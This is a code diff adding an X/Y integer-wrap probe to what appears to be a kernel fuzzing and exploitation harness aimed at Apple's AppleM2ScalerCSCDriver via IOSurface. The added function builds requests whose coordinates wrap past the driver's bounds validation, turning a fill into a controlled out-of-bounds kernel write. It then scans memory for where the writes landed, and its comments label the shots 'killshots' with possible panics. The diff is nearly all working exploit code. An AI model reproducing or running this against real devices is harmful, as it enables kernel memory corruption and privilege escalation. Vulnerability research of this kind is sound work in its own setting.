@@ -16068,6 +16068,116 @@ static void p_scalerfuzz(void) {
     LOG("[sf] done (alive), total cases %ld", caseidx);
 }
 
+// V100: X/Y-wrap killshots. validateBorderFill wraps all 4 fields; baseline
+// varied only W/H. Here X/Y huge with W chosen so X+W wraps to 0x10 (validation
+// passes) while the fill span stays small — write start = f(X,Y) becomes a
+// controlled offset. Giant dst (64MB) with markers-after-settle shows landings.
+static void p_xywrap(void) {
+    int skip = atoi(getenv("FUZZ_XYWRAP_SKIP") ?: "0");
+    LOG("[xyw] v100: X/Y-wrap sweep (skip %d)", skip);
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) return;
+    uint8_t *req = must_map(0x1000);
+    IOSurfaceRef gs = make_surface(64, 64);
+    IOSurfaceRef gd = make_surface(4096, 4096);
+    if (!gs || !gd) return;
+    IOSurfaceID gsi = IOSurfaceGetID(gs), gdi = IOSurfaceGetID(gd);
+    craft_transform(req, gsi, gdi, 64, 64);
+    LOG("[xyw] wire -> kr 0x%08x", scaler_call1(c, req));
+    usleep(1000000);
+    size_t total = (size_t)IOSurfaceGetAllocSize(gd);
+    uint8_t *gbase = (uint8_t *)IOSurfaceGetBaseAddress(gd);
+
+    static const uint32_t cands[] = { 0xFFFFFFF0, 0xFFFFFF00, 0xFFFFF000, 0xFFFF0000,
+                                      0xFF000000, 0xF0000000, 0xC0000000, 0x80000000,
+                                      0x40000000, 0x10000000 };
+    int idx = 0;
+    if (getenv("FUZZ_XYWRAP_FINE")) {
+        // fine Y sweep in the validation-accepted window + color control
+        static const uint32_t fineY[] = { 0xFFFFFFE0, 0xFFFFFFE8, 0xFFFFFFF0, 0xFFFFFFF4,
+                                          0xFFFFFFF8, 0xFFFFFFFC, 0xFFFFFFFF };
+        for (unsigned ci = 0; ci < sizeof(fineY)/sizeof(fineY[0]); ci++) {
+            idx++;
+            if (idx <= skip) continue;
+            uint32_t Y = fineY[ci];
+            uint32_t H = (uint32_t)(0x100000010ULL - Y);
+            if (IOSurfaceLock(gd, 0, NULL) == 0) {
+                for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+                    memset(gbase + p, (int)((p >> 12) & 0xff), 0x1000);
+                IOSurfaceUnlock(gd, 0, NULL);
+            }
+            LOG("[xyw] fine #%d Y=0x%08x H=0x%08x: shot", idx, Y, H);
+            border_payload(req, gsi, gdi, 32, Y, 0xFFFFFFE0, H, 32, 32);
+            // ci==2 = the working Y-wrap — valid but tiny colors (2^n-1)
+            if (ci == 2) {
+                *(uint32_t *)(req + 0xbc) = 0x01;
+                *(uint32_t *)(req + 0xc0) = 0x01;
+                *(uint32_t *)(req + 0xc4) = 0x01;
+                *(uint32_t *)(req + 0xc8) = 0x01;
+            }
+            kern_return_t kr = scaler_call1(c, req);
+            usleep(100000);
+            long bad = 0; size_t first = 0, last = 0;
+            if (IOSurfaceLock(gd, kIOSurfaceLockReadOnly, NULL) == 0) {
+                for (size_t p = 0; p + 0x1000 <= total; p += 0x1000) {
+                    int cnt = 0;
+                    for (size_t i = p; i < p + 0x1000; i += 4)
+                        if (*(uint32_t *)(gbase + i) != (0x01010101u * ((p >> 12) & 0xff))) cnt++;
+                    if (cnt) { if (!bad) first = p; last = p; bad += cnt; }
+                }
+                LOG("[xyw] fine #%d -> kr 0x%08x | bad qwords %ld, pages 0x%zx..0x%zx, first %02x %02x %02x %02x %02x %02x %02x %02x",
+                    idx, kr, bad, first, last,
+                    bad ? gbase[first] : 0, bad ? gbase[first+1] : 0, bad ? gbase[first+2] : 0, bad ? gbase[first+3] : 0,
+                    bad ? gbase[first+4] : 0, bad ? gbase[first+5] : 0, bad ? gbase[first+6] : 0, bad ? gbase[first+7] : 0);
+                IOSurfaceUnlock(gd, kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+        LOG("[xyw] fine done (alive)");
+        return;
+    }
+    for (int axis = 0; axis < 2; axis++) {
+        for (unsigned ci = 0; ci < sizeof(cands)/sizeof(cands[0]); ci++) {
+            idx++;
+            if (idx <= skip) continue;
+            uint32_t v = cands[ci];
+            uint32_t W = (uint32_t)(0x100000010ULL - v);   // v+W wraps to 0x10
+            uint32_t X = axis == 0 ? v : 32;
+            uint32_t Y = axis == 1 ? v : 32;
+            uint32_t WW = axis == 0 ? W : 0xFFFFFFE0;
+            uint32_t HH = axis == 1 ? W : 0xFFFFFFE0;
+            // refill markers
+            if (IOSurfaceLock(gd, 0, NULL) == 0) {
+                for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+                    memset(gbase + p, (int)((p >> 12) & 0xff), 0x1000);
+                IOSurfaceUnlock(gd, 0, NULL);
+            }
+            LOG("[xyw] #%d %s=0x%08x W=0x%08x: shot (PANIC possible)", idx,
+                axis == 0 ? "X" : "Y", v, axis == 0 ? WW : HH);
+            border_payload(req, gsi, gdi, X, Y, WW, HH, 32, 32);
+            kern_return_t kr = scaler_call1(c, req);
+            usleep(100000);
+            // scan
+            long bad = 0; size_t first = 0, last = 0;
+            if (IOSurfaceLock(gd, kIOSurfaceLockReadOnly, NULL) == 0) {
+                for (size_t p = 0; p + 0x1000 <= total; p += 0x1000) {
+                    int cnt = 0;
+                    for (size_t i = p; i < p + 0x1000; i += 4)
+                        if (*(uint32_t *)(gbase + i) != (0x01010101u * ((p >> 12) & 0xff))) cnt++;
+                    if (cnt) { if (!bad) first = p; last = p; bad += cnt; }
+                }
+                if (bad)
+                    LOG("[xyw] #%d -> kr 0x%08x | CORRUPT ~%ld qwords, pages 0x%zx..0x%zx, first bytes %02x %02x %02x %02x",
+                        idx, kr, bad, first, last,
+                        gbase[first], gbase[first+1], gbase[first+2], gbase[first+3]);
+                else
+                    LOG("[xyw] #%d -> kr 0x%08x | no corruption", idx, kr);
+                IOSurfaceUnlock(gd, kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+    }
+    LOG("[xyw] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -16198,6 +16308,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_XYWRAP")) { p_xywrap(); LOG("[probe13] xywrap-only mode, stop"); return NULL; }
         if (getenv("FUZZ_SCALERFUZZ")) { p_scalerfuzz(); LOG("[probe13] scalerfuzz-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DEEPPROBE")) { p_deepprobe(); LOG("[probe13] deepprobe-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IOSWEEP")) { p_iosweep(); LOG("[probe13] iosweep-only mode, stop"); return NULL; }
